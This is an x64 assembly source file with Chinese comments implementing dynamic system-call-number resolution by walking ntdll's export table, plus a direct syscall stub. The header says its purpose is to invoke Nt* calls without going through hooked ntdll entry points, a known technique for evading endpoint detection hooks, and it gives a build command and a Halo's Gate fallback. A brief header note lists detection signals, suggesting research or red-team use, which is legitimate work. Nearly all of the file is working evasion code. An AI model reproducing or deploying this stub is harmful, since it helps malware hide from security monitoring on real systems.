# SSN 动态解析 + 直接系统调用 stub（完整版）
#
# 用途：运行时从 ntdll 导出表读系统调用号，避开硬编码 SSN 的版本耦合；
#       syscall 指令在本模块 .text 内执行——调用不经过 ntdll 被 hook 的函数入口。
# 接口（Windows x64 调用约定，与 main.c 的 C 声明一致）：
#   DWORD GetSSN(const char *name)          → rcx=函数名；eax=SSN（0=未找到/非标准 stub）
#   LONG  DoDirectSyscall(DWORD ssn, ULONG64 args[6])
#                                           → rcx=SSN，rdx=args 指针（按 Nt* 原型顺序摆放）
# 构建：x86_64-w64-mingw32-gcc -c -o syscall.o syscall.asm
#
# 检测侧配对（NOTES.md）：syscall 指令地址不在 ntdll 映射内（源异常遥测）；
# 栈回溯缺 ntdll 帧；ETW-TI 可标记非镜像 syscall 来源。indirect.c 为互补形态。

.intel_syntax noprefix

.text
.global GetSSN
.global DoDirectSyscall

# ── GetSSN：ntdll 导出表遍历（按名匹配）→ 读函数体 mov eax,SSN 的立即数 ──
# 不调任何 API（GetModuleHandle/GetProcAddress 皆不用），纯 PEB+PE 解析
GetSSN:                         # rcx = 函数名指针
    push rsi
    push rdi
    push rbp
    mov rsi, rcx                # rsi = 目标函数名（Win ABI 非易失，已保存）

    # 1) 定位 ntdll 基址：PEB → Ldr → InMemoryOrderModuleList
    #    链表项序：第一项 = 本进程 exe，第二项 = ntdll（连走两跳）
    mov rax, [gs:0x60]          # PEB
    mov rax, [rax+0x18]         # PEB->Ldr
    mov rax, [rax+0x20]         # InMemoryOrderModuleList 头
    mov rax, [rax]              # Flink → exe 的 InMemoryOrderLinks
    mov rax, [rax]              # Flink → ntdll 的 InMemoryOrderLinks
    mov rbp, [rax+0x20]         # DllBase（links 在 +0x10，DllBase 在 +0x30，差 0x20）

    # 2) 导出表定位（x64 = PE32+：OptionalHeader 起始 0x18 + 数据目录 0x70 = 0x88）
    mov eax, [rbp+0x3C]         # e_lfanew
    mov edx, [rbp+rax+0x88]     # Export Directory RVA
    add rdx, rbp                # Export Directory VA（压栈保存，遍历期 rdx 会被复用）
    push rdx
    mov r8d, [rdx+0x20]         # AddressOfNames RVA
    add r8, rbp
    mov r9d, [rdx+0x24]         # AddressOfNameOrdinals RVA
    add r9, rbp
    mov r10d, [rdx+0x14]        # NumberOfNames

    # 3) 按名线性匹配（rcx = 遍历下标）
    xor rcx, rcx
.loop:
    cmp ecx, r10d
    jae .fail
    mov edi, [r8 + rcx*4]       # 候选名 RVA
    add rdi, rbp                # 候选名 VA
    mov rax, rsi                # rax = 目标名遍历指针
.cmp:
    mov dl, [rax]
    mov dh, [rdi]
    cmp dl, dh
    jne .next
    test dl, dl
    jz .found
    inc rax
    inc rdi
    jmp .cmp
.next:
    inc rcx
    jmp .loop

    # 4) 命中：name 下标 → ordinal → 函数 RVA → 读 SSN
.found:
    movzx ecx, word ptr [r9 + rcx*2]   # ordinal（此后不再需要 name 下标）
    mov rdx, [rsp]              # 恢复 Export Directory VA
    mov eax, [rdx+0x1C]         # AddressOfFunctions RVA
    add rax, rbp
    mov eax, [rax + rcx*4]      # 函数 RVA
    add rax, rbp                # 函数 VA
    # 校验标准 syscall stub 前导：4C 8B D1 B8 = mov r10,rcx# mov eax,imm32
    # （被 hook 的函数头几字节已改 → 校验不过返回 0，调用侧走 Halo's Gate 兜底）
    cmp dword ptr [rax], 0x00B8D18B4C
    jne .fail
    mov eax, [rax+4]            # SSN
    jmp .out

.fail:
    xor eax, eax
.out:
    pop rdx                     # 平衡 Export Directory VA 压栈
    pop rbp
    pop rdi
    pop rsi
    ret

# ── DoDirectSyscall：自建 syscall stub（x64 系统调用约定）──
# r10=参数1，rdx/r8/r9=参数2-4，参数5/6 在 [rsp+0x28]/[rsp+0x30]（进入时即调用者栈位）
DoDirectSyscall:                # rcx=SSN，rdx=args[6] 指针
    mov eax, ecx                # SSN → eax
    mov r10, [rdx+0x00]         # 参数 1 → r10
    mov r11, rdx                # args 指针转存（rdx 将被参数 2 占用）
    mov rdx, [r11+0x08]         # 参数 2 → rdx
    mov rcx, [r11+0x10]
    mov r8,  rcx                # 参数 3 → r8
    mov rcx, [r11+0x18]
    mov r9,  rcx                # 参数 4 → r9
    mov rcx, [r11+0x20]
    mov [rsp+0x28], rcx         # 参数 5 → 栈
    mov rcx, [r11+0x28]
    mov [rsp+0x30], rcx         # 参数 6 → 栈
    mov rcx, r10                # rcx 冗余置首参（与真实 stub 行为一致；内核读 r10）
    syscall
    ret
